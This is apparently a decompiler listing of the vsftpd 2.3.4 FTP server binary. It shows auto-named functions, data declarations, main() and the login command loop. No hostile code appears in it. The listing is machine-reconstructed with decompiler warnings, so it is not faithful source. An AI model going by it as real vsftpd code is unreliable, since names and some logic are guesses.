char *__fastcall sub_14C90(struct in_addr *a1);
int __fastcall sub_14CA0(char *cp, _WORD *a2);
void *__fastcall sub_14D20(void **a1, const char *a2);
struct passwd *__fastcall sub_14E60(signed int uid);
struct passwd *j__getpwnam(const char *name);
__int64 __fastcall sub_14EA0(__int64 a1);
__int64 __fastcall sub_14EB0(__int64 a1);
__int64 __fastcall sub_14EC0(__int64 a1);
struct group *__fastcall sub_14EE0(signed int gid);
__int64 __fastcall sub_14F10(__int64 a1);
__int64 __fastcall sub_14F20(_QWORD, _QWORD, _QWORD); // weak
_BOOL8 sub_14FB0();
int __fastcall sub_14FD0(__uid_t a1);
int __fastcall sub_15000(__int64 a1);
int __fastcall sub_15010(__gid_t a1);
int __fastcall sub_15040(__int64 a1);
signed int sub_15050();
signed int sub_15090();
int __fastcall sub_150D0(__uid_t euid);
int __fastcall sub_15100(__int64 a1);
int __fastcall sub_15110(__gid_t egid);
int __fastcall sub_15140(__int64 a1);
int sub_15150();
int __fastcall sub_15180(__int64 a1);
int __fastcall sub_151B0(const char *a1);
__int64 sub_151E0(void); // weak
__mode_t __fastcall sub_151F0(__int16 a1);
__pid_t sub_15210();
int sub_15260();
unsigned __int64 sub_15300();
__time_t sub_15470();
char *sub_154A0();
__suseconds_t sub_155B0();
unsigned __int64 __fastcall sub_155D0(double a1);
char *j__getenv(const char *name);
void __fastcall sub_15680(int a1);
__int64 __fastcall sub_156B0(const char *a1, int a2);
time_t __fastcall sub_156E0(const char *a1);
int __fastcall sub_15880(char *file, __time_t a2, int a3);
int __fastcall sub_158F0(int a1);
__uid_t j__getuid(void);
unsigned __int64 __fastcall sub_15930(rlim64_t a1);
unsigned __int64 sub_15990();
unsigned __int64 sub_159F0();
unsigned int *sub_15A50();
__int64 __fastcall capset(__int64 a1, __int64 a2);
_BOOL8 __fastcall sub_15AE0(_QWORD *a1, _QWORD *a2);
__int64 sub_15C40();
__int64 sub_15CB0(void); // weak
__int64 sub_15D00(void); // weak
unsigned __int64 __fastcall sub_15D70(int a1);
__int64 __fastcall sub_15E70(unsigned int fd, unsigned int a2, __int64 *a3, __int64 a4, unsigned int a5);
void __noreturn sub_16100(void); // weak
__int64 __fastcall sub_161E0(__int64 a1);
unsigned __int64 __fastcall sub_161F0(const char *a1);
unsigned __int64 __fastcall sub_16340(_QWORD *a1);
void *__fastcall sub_16360(int a1, const char **a2);
__int64 nullsub_61(void); // weak
void *__fastcall sub_164A0(size_t len);
unsigned __int64 __fastcall sub_164F0(int a1, int a2);
__int64 __fastcall sub_165C0(int a1);
unsigned __int64 __fastcall sub_166D0(_QWORD *a1, _QWORD *a2);
int sub_168D0();
int sub_16910();
__pid_t sub_16950();
__pid_t sub_169C0();
__pid_t sub_16A30();
__int64 sub_16AA0(void); // weak
void fini(void); // idb
void term_proc();
// int __fastcall _libc_start_main(int (__fastcall *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end);
// int __fastcall __cxa_finalize(void *);
// __int64 _gmon_start__(void); weak

//-------------------------------------------------------------------------
// Data declarations

char byte_9[7] = { '\0', '\0', '\0', '\0', '\0', '\0', '\0' }; // weak
_UNKNOWN main;
_UNKNOWN init;
_UNKNOWN unk_17151; // weak
char byte_17152[2] = { '\xFF', '\0' }; // weak
char byte_176BF[4] = { '\xFF', '\xF4', '\xFF', '\xF2' }; // weak
__int64 (__fastcall *funcs_16B09)() = &sub_4B20; // weak
__int64 (__fastcall *off_21F9D8)() = &sub_4AE0; // weak
void *off_220008 = &off_220008; // idb
char *off_220020 = "secure_chroot_dir"; // weak
char *off_220240 = "accept_timeout"; // weak
char *off_2203A0 = "anonymous_enable"; // weak
_UNKNOWN unk_220890; // weak
_UNKNOWN unk_22089C; // weak
__int64 qword_2208A0 = 0LL; // weak
int dword_2208A8 = -65536; // weak
int dword_2208AC = -1; // weak
int dword_2208B0 = 1; // weak
int dword_2208B4 = 1; // weak
int dword_2208B8 = 1; // weak
char **environ;
char byte_2208C8; // weak
_UNKNOWN unk_2208D0; // weak
_QWORD qword_2208E0[2]; // weak
_UNKNOWN unk_2208F0; // weak
_UNKNOWN unk_220900; // weak
_UNKNOWN unk_220910; // weak
_UNKNOWN unk_220920; // weak
_QWORD qword_220930[2]; // weak
_UNKNOWN unk_220940; // weak
_UNKNOWN unk_220950; // weak
_UNKNOWN unk_220960; // weak
__int64 qword_220970; // weak
_UNKNOWN unk_220980; // weak
_UNKNOWN unk_220990; // weak
_QWORD qword_2209A0[2]; // weak
_UNKNOWN unk_2209B0; // weak
__int64 qword_2209C0; // weak
_UNKNOWN unk_2209D0; // weak
_UNKNOWN unk_2209E0; // weak
_UNKNOWN unk_2209F0; // weak
_UNKNOWN unk_220A00; // weak
_UNKNOWN unk_220A10; // weak
struct stat64 *qword_220A20; // weak
__int64 qword_220A28; // weak
_UNKNOWN unk_220A30; // weak
__int64 qword_220A40; // weak
_QWORD qword_220A50[2]; // weak
_UNKNOWN unk_220A60; // weak
_UNKNOWN unk_220A70; // weak
_UNKNOWN unk_220A80; // weak
_UNKNOWN unk_220A90; // weak
__int64 qword_220AA0; // weak
__int64 qword_220AA8; // weak
_UNKNOWN unk_220AB0; // weak
_QWORD qword_220AC0[2]; // weak
_UNKNOWN unk_220AD0; // weak
_UNKNOWN unk_220AE0; // weak
_UNKNOWN unk_220AF0; // weak
_UNKNOWN unk_220B00; // weak
_UNKNOWN unk_220B10; // weak
_UNKNOWN unk_220B20; // weak
_UNKNOWN unk_220B30; // weak
__int64 qword_220B40; // weak
__int64 qword_220B48; // weak
__int64 qword_220B50; // weak
void *qword_220B58; // idb
_UNKNOWN unk_220B60; // weak
_QWORD qword_220B70[2]; // weak
_UNKNOWN unk_220B80; // weak
_UNKNOWN unk_220B90; // weak
_UNKNOWN unk_220BA0; // weak
_UNKNOWN unk_220BB0; // weak
__int64 qword_220BC0; // weak
_UNKNOWN unk_220BD0; // weak
_UNKNOWN unk_220BE0; // weak
_UNKNOWN unk_220BF0; // weak
_UNKNOWN unk_220C00; // weak
_UNKNOWN unk_220C10; // weak
const void *qword_220C20; // weak
int dword_220C28; // weak
const void *qword_220C30; // weak
int dword_220C38; // weak
__int64 qword_220C40; // weak
int dword_220C48; // weak
__int64 qword_220C50; // weak
__int64 qword_220C58; // weak
__int128 xmmword_220C60; // weak
_QWORD qword_220C70[2]; // weak
_QWORD qword_220C80[2]; // weak
void *qword_220C90; // idb
__int64 qword_220C98; // weak
__int64 qword_220CA0; // weak
__int64 qword_220CA8; // weak
int dword_220CB0; // weak
__int64 qword_220CB8; // weak
__int64 qword_220CC0; // weak
int dword_220CC8; // weak
_UNKNOWN unk_220CD0; // weak
_QWORD qword_220CE0[2]; // weak
_BYTE byte_220CF0[16]; // weak
_UNKNOWN unk_220D00; // weak
_UNKNOWN unk_220D10; // weak
_UNKNOWN unk_220D20; // weak
_UNKNOWN unk_220D30; // weak
_UNKNOWN unk_220D40; // weak
_UNKNOWN unk_220D50; // weak
_QWORD qword_220D60[2]; // weak
_QWORD qword_220D70[2]; // weak
__int64 qword_220D80; // weak
char byte_220DA0[63]; // weak
char byte_220DDF; // weak
char string[16]; // idb
int dword_220DF0; // weak
char buf; // idb
char byte_220E3F; // weak
__int64 qword_220E40; // weak
_UNKNOWN unk_220E60; // weak
char byte_220E80[32]; // idb
char s[63]; // idb
char byte_220EDF; // weak
char byte_220EE0; // weak
char byte_220EE1; // weak
char byte_220EE2; // weak
char byte_220EE3; // weak
char byte_220EE4; // weak
char byte_220EE5; // weak
char byte_220EE6; // weak
char byte_220EE7; // weak
char byte_220EE8; // weak
char byte_220EE9; // weak
char byte_220EEA; // weak
int dword_220EEC; // weak
__int16 word_220F00; // weak
_UNKNOWN unk_220F20; // weak
_UNKNOWN unk_220F40; // weak
_UNKNOWN unk_220F60; // weak
int dword_220F80; // weak
__int64 qword_220F88; // weak
__int64 (__fastcall *qword_220F90)(_QWORD, _QWORD, _QWORD); // weak
unsigned int dword_220FA0[520]; // weak
__int64 qword_2217C0; // weak
__int64 qword_2217C8; // weak
struct timeval tv; // idb
int dword_2217E0; // weak
void *qword_221800; // idb
int dword_221808; // weak
int dword_22180C; // weak
int dword_221810; // weak
int dword_221814; // weak
int dword_221818; // weak
int dword_22181C; // weak
struct utmpx stru_221820; // idb
int dword_2219A0; // weak
_UNKNOWN unk_2219B0; // weak
__int64 qword_2219C0; // weak
int dword_2219C8; // weak
int dword_2219CC; // weak
int dword_2219D0; // weak
int dword_2219D4; // weak
int dword_2219D8; // weak
void *qword_2219E0; // weak
int dword_2219E8; // weak
int dword_2219EC; // weak
void *qword_2219F0; // idb
int dword_2219F8; // weak
int dword_2219FC; // weak
char *qword_221A00; // idb
int dword_221A08; // weak
void *qword_221A10; // idb
int dword_221A18; // weak
int dword_221A1C; // weak
int dword_221A20; // weak
int dword_221A24; // weak
void *qword_221A28; // idb
int dword_221A30; // weak
int dword_221A34; // weak
int dword_221A38; // weak
void *qword_221A40; // idb
int dword_221A48; // weak
int dword_221A4C; // weak
char *qword_221A50; // idb
int dword_221A58; // weak
int dword_221A5C; // weak
int dword_221A60; // weak
void *qword_221A68; // idb
int dword_221A70; // weak
int dword_221A74; // weak
int dword_221A78; // weak
int dword_221A7C; // weak
int dword_221A80; // weak
int dword_221A84; // weak
int dword_221A88; // weak
int dword_221A8C; // weak
int dword_221A90; // weak
int dword_221A94; // weak
int dword_221A98; // weak
char *cp; // idb
int dword_221AA8; // weak
int dword_221AAC; // weak
int dword_221AB0; // weak
int dword_221AB4; // weak
int dword_221AB8; // weak
int dword_221ABC; // weak
__int64 qword_221AC0; // weak
void *qword_221AC8; // idb
int dword_221AD0; // weak
int dword_221AD4; // weak
int dword_221AD8; // weak
int dword_221ADC; // weak
int dword_221AE0; // weak
int dword_221AE4; // weak
int dword_221AE8; // weak
void *qword_221AF0; // idb
void *qword_221AF8; // idb
__int64 qword_221B00; // weak
void *ptr; // idb
int dword_221B10; // weak
void *qword_221B18; // idb
__int64 qword_221B20; // weak
int dword_221B28; // weak
int dword_221B2C; // weak
void *qword_221B30; // weak
int dword_221B38; // weak
int dword_221B3C; // weak
__int64 qword_221B40; // weak
int dword_221B48; // weak
int dword_221B4C; // weak
int dword_221B50; // weak
char *qword_221B58; // idb
void *qword_221B60; // idb
int dword_221B68; // weak
int dword_221B6C; // weak
int dword_221B70; // weak
int dword_221B74; // weak
__int64 qword_221B78; // weak
int dword_221B80; // weak
int dword_221B84; // weak
int dword_221B88; // weak
__int64 qword_221B90; // weak
void *qword_221B98; // weak
int dword_221BA0; // weak
int dword_221BA4; // weak
__int64 qword_221BA8; // weak
int dword_221BB0; // weak
int dword_221BB4; // weak
void *qword_221BB8; // idb
unsigned int seconds; // idb
int dword_221BC4; // weak
int dword_221BC8; // weak
int dword_221BCC; // weak
int dword_221BD0; // weak
int dword_221BD4; // weak
int dword_221BD8; // weak
int dword_221BDC; // weak
int dword_221BE0; // weak
unsigned int dword_221BE4; // idb
int dword_221BE8; // weak
int dword_221BEC; // weak
int dword_221BF0; // weak
int dword_221BF4; // weak
int dword_221BF8; // weak
int dword_221BFC; // weak
int dword_221C00; // weak
int dword_221C04; // weak
int dword_221C08; // weak
void *qword_221C10; // idb
int dword_221C18; // weak
int dword_221C1C; // weak
int dword_221C20; // weak
void *qword_221C28; // idb
int dword_221C30; // weak
int dword_221C34; // weak
int dword_221C38; // weak
int dword_221C3C; // weak
int dword_221C40; // weak
int dword_221C44; // weak
int dword_221C48; // weak
int dword_221C4C; // weak
void *qword_221C50; // idb
__int64 qword_221C58; // weak
int dword_221C60; // weak
char *qword_221C68; // idb
int dword_221C70; // weak
__int64 qword_221C78; // weak
int dword_221C80; // weak
int dword_221C84; // weak
int dword_221C88; // weak


//----- (0000000000003AD0) ----------------------------------------------------
__int64 (**init_proc())(void)
{
  __int64 (**result)(void); // rax

  result = &_gmon_start__;
  if ( &_gmon_start__ )
    return (__int64 (**)(void))_gmon_start__();
  return result;
}
// 222088: using guessed type __int64 _gmon_start__(void);

//----- (0000000000003AF0) ----------------------------------------------------
void sub_3AF0()
{
  JUMPOUT(0LL);
}
// 3AF6: control flows out of bounds to 0

//----- (00000000000042D0) ----------------------------------------------------
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  char **v4; // r15
  int v5; // r12d
  char *v6; // rdi
  char v7; // dl
  char *v8; // rax
  struct passwd *v9; // rdi
  __int64 v10; // rax
  void *v11; // rsi
  unsigned int v12; // eax
  const char *v13; // rax
  struct passwd *v14; // rax
  __int64 v15; // rsi
  unsigned int v16; // eax
  __int64 v17; // rsi
  unsigned int v18; // eax
  unsigned int v19; // eax
  struct passwd *v20; // rax
  struct passwd *v21; // rax
  void *ptr; // [rsp+18h] [rbp-220h] BYREF
  __int64 v23[59]; // [rsp+20h] [rbp-218h] BYREF
  unsigned __int64 v24[8]; // [rsp+1F8h] [rbp-40h] BYREF

  v24[0] = __readfsqword(0x28u);
  memset(v23, 0, sizeof(v23));
  LODWORD(v23[3]) = -1;
  v23[23] = -1LL;
  LODWORD(v23[24]) = -1;
  LODWORD(v23[34]) = -1;
  v23[47] = -1LL;
  *(__int64 *)((char *)&v23[57] + 4) = -1LL;
  v23[33] = 0xFFFFFFFF00000001LL;
  LODWORD(v23[5]) = -1;
  LODWORD(v23[9]) = 1;
  LODWORD(v23[15]) = 1;
  sub_93D0(v24, a2, a3);
  nullsub_61();
  if ( !a1 )
    sub_4B80("vsftpd: missing argv[0]");
  if ( a1 <= 1 )
    goto LABEL_60;
  v4 = a2 + 1;
  v5 = 0;
  do
  {
    v6 = *v4;
    if ( **v4 == 45 )
    {
      v7 = v6[1];
      if ( v7 == 118 )
        sub_4C20("vsftpd: version 2.3.4\n");
      if ( v7 != 111 )
        sub_4BA0("unrecognise option: ", *v4);
      sub_DE20(v6 + 2, 1LL);
    }
    else
    {
      v5 = 1;
      sub_E110(v6);
    }
    ++v4;
  }
  while ( v4 != &a2[(unsigned int)(a1 - 2) + 2] );
  if ( !v5 )
  {
LABEL_60:
    ptr = 0LL;
    v19 = sub_13960("/etc/vsftpd.conf");
    if ( !(unsigned int)sub_13F40(v19, &ptr) )
      sub_E110("/etc/vsftpd.conf");
    sub_12BB0(ptr);
  }
  if ( cp && dword_221A5C )
  {
    ptr = 0LL;
    sub_14D20(&ptr);
    sub_12BB0(cp);
    v13 = (const char *)sub_14C00(ptr);
    cp = j__strdup(v13);
    sub_12BB0(ptr);
  }
  if ( !dword_221BE8 && !(unsigned int)sub_14FB0() )
    sub_4B80("vsftpd: must be started as root (see run_as_launching_user option)");
  if ( dword_221C60 )
    sub_16360((unsigned int)a1, a2);
  if ( dword_221AB0 )
    sub_112B0(v23);
  if ( dword_221A48 || dword_221A80 )
    v23[48] = sub_10080();
  if ( dword_221B3C )
    sub_107D0(0LL);
  v8 = j__getenv("VSFTPD_LOAD_CONF");
  if ( v8 )
    sub_E110(v8);
  ptr = 0LL;
  sub_13900(0);
  if ( !(unsigned int)sub_13A60(ptr, &ptr) )
    sub_4B80("vsftpd: not configured for standalone, must be started from inetd");
  sub_12BB0(ptr);
  if ( dword_221C40 )
  {
    if ( dword_221B50 )
      sub_4B80("vsftpd: security: 'one_process_model' is anonymous only");
    if ( !(unsigned int)sub_15C40() )
      sub_4B80("vsftpd: security: 'one_process_model' needs a better OS");
  }
  if ( !dword_221B50 && !dword_221B80 )
    sub_4B80("vsftpd: both local and anonymous access disabled!");
  if ( dword_221AD0 )
  {
    if ( !dword_221B68 )
      goto LABEL_32;
  }
  else if ( !dword_221B68 )
  {
    sub_4B80("vsftpd: both FTP and HTTP disabled!");
  }
  if ( !dword_221C40 )
    sub_4B80("vsftpd: HTTP needs 'one_process_model' for now");
LABEL_32:
  sub_146B0(0);
  v9 = 0LL;
  sub_145C0(0);
  if ( dword_221B80 )
  {
    v21 = j__getpwnam(qword_221B58);
    if ( !v21 )
      sub_4BA0("vsftpd: cannot locate user specified in 'ftp_username':", qword_221B58);
    v9 = v21;
    LODWORD(v23[23]) = sub_14EC0(v21, v23);
  }
  if ( dword_221BEC )
  {
    v20 = j__getpwnam(qword_221A00);
    if ( !v20 )
      sub_4BA0("vsftpd: cannot locate user specified in 'guest_username':", qword_221A00);
    v9 = v20;
    HIDWORD(v23[23]) = sub_14EC0(v20, v23);
  }
  if ( dword_221C18 )
  {
    v14 = j__getpwnam(qword_221A50);
    if ( !v14 )
      sub_4BA0("vsftpd: cannot locate user specified in 'chown_username':", qword_221A50);
    v9 = v14;
    LODWORD(v23[24]) = sub_14EC0(v14, v23);
  }
  sub_15210(v9, v23);
  sub_151F0(63LL);
  sub_15300();
  sub_125B0(4LL);
  sub_15930((-(__int64)(dword_221B4C == 0) & 0xFFFFFFFFF3800000LL) + 314572800);
  sub_C060(v23);
  v10 = sub_14C00(v23[1]);
  sub_C370(&v23[35], v10);
  sub_5540();
  if ( dword_221C60 )
  {
    sub_161E0(&v23[35]);
    sub_161F0("connected");
  }
  if ( !dword_221AB0 )
  {
    if ( dword_221A70 )
    {
      v15 = qword_221B20;
      v16 = sub_DCF0(&v23[25], qword_221B20, 100000LL);
      if ( (unsigned int)sub_13F40(v16, v15) )
        sub_4BA0("cannot read anon e-mail list file:", qword_221B20);
    }
    v11 = qword_221B60;
    if ( !qword_221B60 || (v12 = sub_DCF0(&v23[31], qword_221B60, 100000LL), !(unsigned int)sub_13F40(v12, v11)) )
    {
      if ( dword_221A1C )
      {
        v17 = qword_221B90;
        v18 = sub_DCF0(&v23[27], qword_221B90, 100000LL);
        if ( (unsigned int)sub_13F40(v18, v17) )
          sub_4BA0("cannot read email passwords file:", qword_221B90);
      }
      if ( dword_221BE8 )
      {
        dword_221C40 = 1;
        if ( !(unsigned int)sub_14FB0() )
        {
          dword_221A60 = 0;
          dword_221C18 = 0;
        }
      }
      if ( !dword_221C40 )
        sub_EFF0(v23);
      sub_E850(v23);
    }
    sub_4BA0("cannot read banner file:", qword_221B60);
  }
  sub_112B0(v23);
}
// 4B80: using guessed type void __fastcall __noreturn sub_4B80(_QWORD);
// 4BA0: using guessed type void __fastcall __noreturn sub_4BA0(_QWORD, _QWORD);
// 4C20: using guessed type void __fastcall __noreturn sub_4C20(_QWORD);
// 5540: using guessed type __int64 sub_5540(void);
// 93D0: using guessed type __int64 __fastcall sub_93D0(_QWORD, _QWORD, _QWORD);
// C060: using guessed type __int64 __fastcall sub_C060(_QWORD);
// C370: using guessed type __int64 __fastcall sub_C370(_QWORD, _QWORD);
// DCF0: using guessed type __int64 __fastcall sub_DCF0(_QWORD, _QWORD, _QWORD);
// DE20: using guessed type __int64 __fastcall sub_DE20(_QWORD, _QWORD);
// E850: using guessed type void __fastcall __noreturn sub_E850(_QWORD);
// EFF0: using guessed type void __fastcall __noreturn sub_EFF0(_QWORD);
// 10080: using guessed type __int64 sub_10080(void);
// 107D0: using guessed type void __fastcall __noreturn sub_107D0(_QWORD);
// 112B0: using guessed type void __fastcall __noreturn sub_112B0(_QWORD);
// 125B0: using guessed type __int64 __fastcall sub_125B0(_QWORD);
// 13A60: using guessed type __int64 __fastcall sub_13A60(_QWORD, _QWORD);
// 13F40: using guessed type __int64 __fastcall sub_13F40(_QWORD, _QWORD);
// 14C00: using guessed type __int64 __fastcall sub_14C00(_QWORD);
// 14D20: using guessed type __int64 __fastcall sub_14D20(_QWORD);
// 14EC0: using guessed type __int64 __fastcall sub_14EC0(_QWORD, _QWORD);
// 14FB0: using guessed type __int64 sub_14FB0(void);
// 151F0: using guessed type __int64 __fastcall sub_151F0(_QWORD);
// 15210: using guessed type __int64 __fastcall sub_15210(_QWORD, _QWORD);
// 15300: using guessed type __int64 sub_15300(void);
// 15930: using guessed type __int64 __fastcall sub_15930(_QWORD);
// 15C40: using guessed type __int64 sub_15C40(void);
// 161E0: using guessed type __int64 __fastcall sub_161E0(_QWORD);
// 161F0: using guessed type __int64 __fastcall sub_161F0(_QWORD);
// 16360: using guessed type __int64 __fastcall sub_16360(_QWORD, _QWORD);
// 16490: using guessed type __int64 nullsub_61(void);
// 221A1C: using guessed type int dword_221A1C;
// 221A48: using guessed type int dword_221A48;
// 221A5C: using guessed type int dword_221A5C;
// 221A60: using guessed type int dword_221A60;
// 221A70: using guessed type int dword_221A70;
// 221A80: using guessed type int dword_221A80;
// 221AB0: using guessed type int dword_221AB0;
// 221AD0: using guessed type int dword_221AD0;
// 221B20: using guessed type __int64 qword_221B20;
// 221B3C: using guessed type int dword_221B3C;
// 221B4C: using guessed type int dword_221B4C;
// 221B50: using guessed type int dword_221B50;
// 221B68: using guessed type int dword_221B68;
// 221B80: using guessed type int dword_221B80;
// 221B90: using guessed type __int64 qword_221B90;
// 221BE8: using guessed type int dword_221BE8;
// 221BEC: using guessed type int dword_221BEC;
// 221C18: using guessed type int dword_221C18;
// 221C40: using guessed type int dword_221C40;
// 221C60: using guessed type int dword_221C60;
// 42D0: using guessed type unsigned __int64 var_40[8];

//----- (0000000000004A20) ----------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __fastcall __noreturn start(__int64 a1, __int64 a2, void (*a3)(void))
{
  __int64 v3; // rax
  int v4; // esi
  __int64 v5; // [rsp-8h] [rbp-8h] BYREF
  char *retaddr; // [rsp+0h] [rbp+0h] BYREF

  v4 = v5;
  v5 = v3;
  _libc_start_main((int (__fastcall *)(int, char **, char **))main, v4, &retaddr, (void (*)(void))init, fini, a3, &v5);
  __halt();
}
// 4A26: positive sp value 8 has been found
// 4A2D: variable 'v3' is possibly undefined

//----- (0000000000004A50) ----------------------------------------------------
char ***sub_4A50()
{
  return &environ;
}

//----- (0000000000004A90) ----------------------------------------------------
__int64 sub_4A90()
{
  return 0LL;
}
// 4A90: using guessed type __int64 sub_4A90();

//----- (0000000000004AE0) ----------------------------------------------------
char ***sub_4AE0()
{
  char ***result; // rax

  if ( !byte_2208C8 )
  {
    if ( &__cxa_finalize )
      _cxa_finalize(off_220008);
    result = sub_4A50();
    byte_2208C8 = 1;
  }
  return result;
}
// 2208C8: using guessed type char byte_2208C8;

//----- (0000000000004B20) ----------------------------------------------------
__int64 sub_4B20()
{
  return sub_4A90();
}
// 4A90: using guessed type __int64 sub_4A90(void);
// 4B20: using guessed type __int64 sub_4B20();

//----- (0000000000004B30) ----------------------------------------------------
void __fastcall __noreturn sub_4B30(const char *a1)
{
  int v1; // eax

  sub_130E0(0);
  sub_129A0(0, (__int64)"500 OOPS: ", 10);
  v1 = sub_13610(a1);
  sub_129A0(0, (__int64)a1, v1);
  sub_129A0(0, (__int64)"\r\n", 2);
  sub_12C90(1);
}

//----- (0000000000004B80) ----------------------------------------------------
void __noreturn sub_4B80()
{
  sub_4B30();
}
// 4B30: using guessed type void __noreturn sub_4B30(void);

//----- (0000000000004BA0) ----------------------------------------------------
void __fastcall __noreturn sub_4BA0(const char *a1, const char *a2)
{
  const char *v2; // rax
  char *v3[7]; // [rsp+0h] [rbp-38h] BYREF

  v3[0] = 0LL;
  v3[1] = 0LL;
  v3[3] = (char *)__readfsqword(0x28u);
  sub_C370((__int64)v3, a1);
  sub_C670(v3, a2);
  v2 = (const char *)sub_C510(v3);
  sub_4B30(v2);
}

//----- (0000000000004BF3) ----------------------------------------------------
void __noreturn sub_4BF3()
{
  sub_12C90(1);
}
// 4BF3: using guessed type void __noreturn sub_4BF3();

//----- (0000000000004C20) ----------------------------------------------------
void __fastcall __noreturn sub_4C20(const char *a1)
{
  int v1; // eax

  v1 = sub_13610(a1);
  sub_129A0(0, (__int64)a1, v1);
  sub_12C90(0);
}

//----- (0000000000004C40) ----------------------------------------------------
int __fastcall sub_4C40(__int64 a1)
{
  _QWORD *v1; // rsi
  unsigned int v2; // eax
  bool v3; // cf

  if ( sub_C4F0(a1 + 80) )
    return sub_5560(a1, 503, "Login with USER first.");
  v1 = (_QWORD *)(a1 + 360);
  if ( dword_221C40 )
    sub_E8E0(a1, v1);
  else
    sub_F400(a1, v1);
  sub_5560(a1, 530, "Login incorrect.");
  v2 = *(_DWORD *)(a1 + 468) + 1;
  v3 = v2 < dword_221BA0;
  *(_DWORD *)(a1 + 468) = v2;
  if ( !v3 )
    sub_12C90(0);
  return (unsigned int)sub_C570(a1 + 80);
}
// 221BA0: using guessed type int dword_221BA0;
// 221C40: using guessed type int dword_221C40;

//----- (0000000000004D00) ----------------------------------------------------
void __fastcall __noreturn sub_4D00(__int64 a1)
{
  _BOOL4 v1; // ecx
  unsigned int v2; // eax
  bool v3; // cf
  const char *v4; // rdx
  _BOOL4 v5; // [rsp+4h] [rbp-64h]
  __int64 v6[11]; // [rsp+10h] [rbp-58h] BYREF

  v6[3] = __readfsqword(0x28u);
  if ( dword_221C60 )
    sub_161F0("not logged in");
  sub_56C0(a1);
  v6[0] = 0LL;
  v6[1] = 0LL;
  if ( dword_221C00 && (unsigned int)dword_221C00 < *(_DWORD *)(a1 + 384) )
  {
    sub_C370((__int64)v6, "Connection refused: too many sessions.");
    sub_C230(a1, 8, (__int64)v6);
    sub_5640(a1, 421, "There are too many connected users, please try later.");
  }
  if ( dword_221A24 && (unsigned int)dword_221A24 < *(_DWORD *)(a1 + 388) )
  {
    sub_C370((__int64)v6, "Connection refused: too many sessions for this address.");
    sub_C230(a1, 8, (__int64)v6);
    sub_5640(a1, 421, "There are too many connections from your internet address.");
  }
  if ( !*(_DWORD *)(a1 + 264) )
  {
    sub_C370((__int64)v6, "Connection refused: tcp_wrappers denial.");
    sub_C230(a1, 8, (__int64)v6);
    sub_5640(a1, 421, "Service not available.");
  }
  sub_C230(a1, 8, (__int64)v6);
  if ( dword_221AB0 && dword_2219EC )
    nullsub_1(a1);
  if ( dword_221AD0 )
  {
    if ( sub_C4F0(a1 + 248) )
    {
      if ( ptr )
        sub_5560(a1, 220, (const char *)ptr);
      else
        sub_5560(a1, 220, "(vsFTPd 2.3.4)");
    }
    else
    {
      sub_DB20(a1, a1 + 248, 220);
      sub_C440(a1 + 248);
      sub_5560(a1, 220, "");
    }
  }
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            while ( 1 )
            {
              sub_56E0(a1, (__int64 *)(a1 + 344), a1 + 360, 1);
              if ( dword_221AD0 )
                break;
              if ( dword_221B68 )
              {
                if ( sub_C600(a1 + 344, "GET") )
                {
                  *(_DWORD *)(a1 + 152) = 1;
                  sub_C3A0(a1 + 160, a1 + 360);
                  sub_C370(a1 + 80, "FTP");
                  sub_C370(a1 + 360, "<http>");
                  sub_4C40(a1);
                }
                else
                {
                  sub_5560(a1, 530, "Bad HTTP verb.");
                }
                sub_12C90(0);
              }
            }
            if ( !sub_C600(a1 + 344, "USER") )
              break;
            sub_C3A0(a1 + 80, a1 + 360);
            sub_C750(a1 + 360);
            if ( sub_C600(a1 + 360, "FTP") || (v1 = sub_C600(a1 + 360, "ANONYMOUS")) )
            {
              if ( *(_DWORD *)(a1 + 408) )
              {
                if ( !dword_221C70 && !dword_221BB4 )
                {
                  v4 = "Anonymous sessions may not use encryption.";
LABEL_50:
                  sub_5560(a1, 530, v4);
                  goto LABEL_32;
                }
              }
              else if ( dword_221AB0 && dword_221BB4 )
              {
                sub_5560(a1, 530, "Anonymous sessions must use encryption.");
                sub_12C90(0);
              }
              if ( !dword_221BD0 )
                goto LABEL_40;
              v1 = 1;
              goto LABEL_26;
            }
            v4 = "This FTP server is anonymous only.";
            if ( !dword_221B50 )
              goto LABEL_50;
            if ( dword_221AB0 && !*(_DWORD *)(a1 + 408) && dword_221C3C )
            {
              sub_5560(a1, 530, "Non-anonymous sessions must use encryption.");
              sub_12C90(0);
            }
            if ( dword_221BD0 )
            {
LABEL_26:
              v5 = v1;
              if ( (unsigned int)sub_D180(a1 + 232, a1 + 80) )
              {
                if ( dword_221A74 )
                  goto LABEL_28;
LABEL_39:
                if ( !v5 )
                  goto LABEL_41;
LABEL_40:
                if ( !dword_221C84 )
                  goto LABEL_41;
                sub_C370(a1 + 360, "<no password>");
                sub_4C40(a1);
              }
              else
              {
                if ( dword_221A74 )
                  goto LABEL_39;
LABEL_28:
                if ( dword_221ADC )
                  sub_155D0((double)dword_221ADC);
                sub_5560(a1, 530, "Permission denied.");
                v2 = *(_DWORD *)(a1 + 468) + 1;
                v3 = v2 < dword_221BA0;
                *(_DWORD *)(a1 + 468) = v2;
                if ( !v3 )
                  sub_12C90(0);
LABEL_32:
                sub_C570(a1 + 80);
              }
            }
            else
            {
LABEL_41:
              sub_5560(a1, 331, "Please specify the password.");
            }
          }
          if ( !sub_C600(a1 + 344, "PASS") )
            break;
          sub_4C40(a1);
        }
        if ( sub_C600(a1 + 344, "QUIT") )
          sub_5640(a1, 221, "Goodbye.");
        if ( !sub_C600(a1 + 344, "FEAT") )
          break;
        sub_10DB0(a1);
      }
      if ( !sub_C600(a1 + 344, "OPTS") )
        break;
      sub_11250(a1);
    }
    if ( dword_221AB0 )
    {
      if ( sub_C600(a1 + 344, "AUTH") && !*(_DWORD *)(a1 + 408) )
      {
        nullsub_2(a1);
      }
      else
      {
        if ( !dword_221AB0 )
          goto LABEL_59;
        if ( sub_C600(a1 + 344, "PBSZ") )
        {
          nullsub_3(a1);
        }
        else
        {
          if ( !dword_221AB0 || !sub_C600(a1 + 344, "PROT") )
            goto LABEL_59;
          nullsub_4(a1);
        }
      }
    }
    else
    {
LABEL_59:
      if ( !sub_C4F0(a1 + 344) || !sub_C4F0(a1 + 360) )
        sub_5560(a1, 530, "Please login with USER and PASS.");
    }
  }
}
// 112C0: using guessed type __int64 __fastcall nullsub_1(_QWORD);
// 112D0: using guessed type __int64 __fastcall nullsub_2(_QWORD);
// 112E0: using guessed type __int64 __fastcall nullsub_3(_QWORD);
